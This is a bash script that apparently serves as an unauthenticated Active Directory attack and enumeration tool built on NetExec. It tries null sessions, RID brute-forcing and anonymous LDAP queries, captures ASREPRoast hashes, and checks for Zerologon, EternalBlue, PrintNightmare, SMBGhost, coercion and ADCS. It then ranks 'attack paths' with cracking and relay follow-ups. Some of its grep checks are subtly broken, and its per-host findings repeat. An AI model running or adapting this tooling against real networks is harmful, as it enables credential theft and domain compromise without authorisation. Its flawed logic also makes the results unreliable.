#!/usr/bin/env bash
# ============================================================================
# pre_auth_enum.sh — Unauthenticated Windows/AD Enumeration
# ============================================================================
# All output → ONE .md file. 20s timeout per call.
# Usage: ./pre_auth_enum.sh [--hosts winhosts.txt] [--users users.txt]
# ============================================================================
set -euo pipefail

HOSTS_FILE="winhosts.txt"
USERS_FILE="users.txt"
T=20
OUT="pre_auth_results_$(date +%Y%m%d_%H%M%S).md"

while [[ $# -gt 0 ]]; do
    case "$1" in
        --hosts)  HOSTS_FILE="$2"; shift 2 ;;
        --users)  USERS_FILE="$2"; shift 2 ;;
        --out)    OUT="$2"; shift 2 ;;
        -h|--help) echo "Usage: $0 [--hosts FILE] [--users FILE]"; exit 0 ;;
        *) echo "Unknown: $1"; exit 1 ;;
    esac
done

[[ ! -f "$HOSTS_FILE" ]] && echo "[!] Not found: $HOSTS_FILE" && exit 1
HOST_COUNT=$(grep -cvE '^\s*#|^\s*$' "$HOSTS_FILE")
TARGETS=$(grep -vE '^\s*#|^\s*$' "$HOSTS_FILE" | tr -d '\r' | tr '\n' ' ')

cat > "$OUT" << EOF
# Pre-Auth Enumeration Results
**Date:** $(date)
**Hosts:** $HOST_COUNT ($TARGETS)
**Timeout:** ${T}s per call

---

EOF

r() {
    local label="$1"; shift
    echo "  [*] $label"
    printf '## %s\n```\n' "$label" >> "$OUT"
    timeout "$T" "$@" >> "$OUT" 2>&1 && true
    local rc=$?
    [[ $rc -eq 124 ]] && printf '\n(TIMEOUT after %ds)\n' "$T" >> "$OUT"
    [[ $rc -ne 0 && $rc -ne 124 ]] && printf '\n(exit %d)\n' "$rc" >> "$OUT"
    printf '```\n\n---\n\n' >> "$OUT"
    return 0
}

# ── SMB Discovery ─────────────────────────────────────────────────────
echo -e "\n[+] SMB Discovery"
r "SMB Fingerprint"                nxc smb $TARGETS
r "SMB Signing / Relay List"       nxc smb $TARGETS --gen-relay-list /tmp/relay_targets.txt

# ── Null / Guest ──────────────────────────────────────────────────────
echo -e "\n[+] Null / Guest"
r "Null Session (shares+users+policy)"  nxc smb $TARGETS -u '' -p '' --shares --users --pass-pol
r "Null RID Brute"                 nxc smb $TARGETS -u '' -p '' --rid-brute
r "Guest Check"                    nxc smb $TARGETS -u 'a' -p '' --shares

# ── LDAP Anonymous ────────────────────────────────────────────────────
echo -e "\n[+] LDAP Anonymous"
r "LDAP Anonymous Enum"            nxc ldap $TARGETS -u '' -p '' --users --groups

# ── ASREPRoast ────────────────────────────────────────────────────────
if [[ -f "$USERS_FILE" ]]; then
    echo -e "\n[+] ASREPRoast"
    # Try each user individually so one bad line doesn't kill the whole check
    printf '## ASREPRoast\n```\n' >> "$OUT"
    while IFS= read -r ASREP_USER; do
        [[ -z "$ASREP_USER" || "$ASREP_USER" =~ ^# ]] && continue
        ASREP_USER=$(echo "$ASREP_USER" | tr -d '\r')
        echo "  [*] ASREPRoast: $ASREP_USER"
        timeout "$T" nxc ldap $TARGETS -u "$ASREP_USER" -p '' --asreproast /tmp/asrep_hashes.txt >> "$OUT" 2>&1 && true
    done < "$USERS_FILE"
    printf '```\n\n---\n\n' >> "$OUT"
    if [[ -f /tmp/asrep_hashes.txt && -s /tmp/asrep_hashes.txt ]]; then
        printf '## ASREPRoast Hashes Captured\n```\n' >> "$OUT"
        cat /tmp/asrep_hashes.txt >> "$OUT"
        printf '\n```\n\n---\n\n' >> "$OUT"
    fi
fi

# ── SMB Modules ───────────────────────────────────────────────────────
echo -e "\n[+] SMB Modules"
r "coerce_plus"                    nxc smb $TARGETS -u '' -p '' -M coerce_plus
r "zerologon"                      nxc smb $TARGETS -u '' -p '' -M zerologon
r "printnightmare"                 nxc smb $TARGETS -u '' -p '' -M printnightmare
r "ms17-010 (EternalBlue)"        nxc smb $TARGETS -u '' -p '' -M ms17-010
r "smbghost"                       nxc smb $TARGETS -u '' -p '' -M smbghost

# ── LDAP Modules ──────────────────────────────────────────────────────
echo -e "\n[+] LDAP Modules"
r "adcs"                           nxc ldap $TARGETS -u '' -p '' -M adcs
r "maq"                            nxc ldap $TARGETS -u '' -p '' -M maq

# ── NTLMv1 Check ──────────────────────────────────────────────────────
echo -e "\n[+] NTLMv1 Check"
r "NTLMv1 (signing+ntlmv1)"       nxc smb $TARGETS -u '' -p '' --ntlmv1

# ── Relay Targets ─────────────────────────────────────────────────────
if [[ -f /tmp/relay_targets.txt && -s /tmp/relay_targets.txt ]]; then
    printf '## Relay Targets (signing disabled)\n```\n' >> "$OUT"
    cat /tmp/relay_targets.txt >> "$OUT"
    printf '\n```\n\n---\n\n' >> "$OUT"
fi

# ============================================================================
# ATTACK PATH SCORING
# ============================================================================
printf '\n# Attack Path Summary\n\n' >> "$OUT"
N=0
add() { N=$((N+1)); printf '**%d. [%s] %s**\n%s\n\n' "$N" "$1" "$2" "$3" >> "$OUT"; }

RELAY_FILE="/tmp/relay_targets.txt"

for HOST in $(grep -vE '^\s*#|^\s*$' "$HOSTS_FILE" | tr -d '\r'); do
    # Relay chain
    SO=false; [[ -f "$RELAY_FILE" ]] && grep -q "$HOST" "$RELAY_FILE" 2>/dev/null && SO=true
    $SO && add "HIGH" "SMB Signing Off — $HOST" "Relay precondition met. Check coercion + KrbRelayUp."

    # Zerologon
    grep -A5 "zerologon" "$OUT" | grep -qiE "VULN" 2>/dev/null && \
        add "CRIT" "Zerologon — $HOST" "DC accepted zeroed challenge. Full domain compromise."

    # EternalBlue
    grep -A5 "ms17-010" "$OUT" | grep -qiE "VULN" 2>/dev/null && \
        add "CRIT" "EternalBlue (MS17-010) — $HOST" "Remote code execution. Full pwn."

    # SMBGhost
    grep -A5 "smbghost" "$OUT" | grep -qiE "VULN" 2>/dev/null && \
        add "CRIT" "SMBGhost — $HOST" "SMB 3.1.1 compression vuln."

    # PrintNightmare
    grep -A5 "printnightmare" "$OUT" | grep -qiE "VULN" 2>/dev/null && \
        add "HIGH" "PrintNightmare — $HOST" "Spooler RPC exposed."

    # NTLMv1
    grep -A5 "NTLMv1" "$OUT" | grep -qiE "True\|enabled\|NTLMv1" 2>/dev/null && \
        add "CRIT" "NTLMv1 Enabled — $HOST" "Downgrade + crack. DC still has NTLMv1."

    # ASREPRoast
    [[ -f /tmp/asrep_hashes.txt && -s /tmp/asrep_hashes.txt ]] && \
        add "HIGH" "ASREPRoast" "Hashes captured. \`hashcat -m 18200\`"

    # Null session data
    grep -A10 "Null Session" "$OUT" | grep -qiE "\[\+\]" 2>/dev/null && \
        add "HIGH" "Null Session — $HOST" "Data returned with empty creds."

    # RID cycling
    grep -A20 "Null RID Brute" "$OUT" | grep -qiE "SidTypeUser\|SidTypeGroup" 2>/dev/null && \
        add "LOW" "RID Cycling — $HOST" "User/group enumeration via RID brute."

    # Guest auth
    grep -A5 "Guest Check" "$OUT" | grep -qiE "\[\+\]" 2>/dev/null && \
        add "LOW" "Guest Auth Allowed — $HOST" "Junk username authenticates."

    # ADCS
    grep -A5 "adcs" "$OUT" | grep -qiE "\[\+\]" 2>/dev/null && \
        add "HIGH" "ADCS CA Found — $HOST" "Certificate services. \`certipy find -dc-ip $HOST -vulnerable\`"

    # MAQ > 0
    grep -A5 "maq" "$OUT" | grep -qE "MachineAccountQuota:.*[1-9]" 2>/dev/null && \
        add "MEDIUM" "MAQ > 0 — $HOST" "Machine account creation → RBCD/NoPAC/KrbRelayUp."

    # Coercion
    grep -A10 "coerce_plus" "$OUT" | grep -qiE "VULN\|\[\+\]" 2>/dev/null && \
        add "HIGH" "Coercion Possible — $HOST" "PetitPotam/EFSRpc/PrinterBug. Pair with relay or KrbRelayUp."
done

printf '\n**Total findings: %d** | %s\n' "$N" "$(date)" >> "$OUT"

echo -e "\n============================================================"
echo "  Done — $N findings → $OUT"
echo "============================================================"
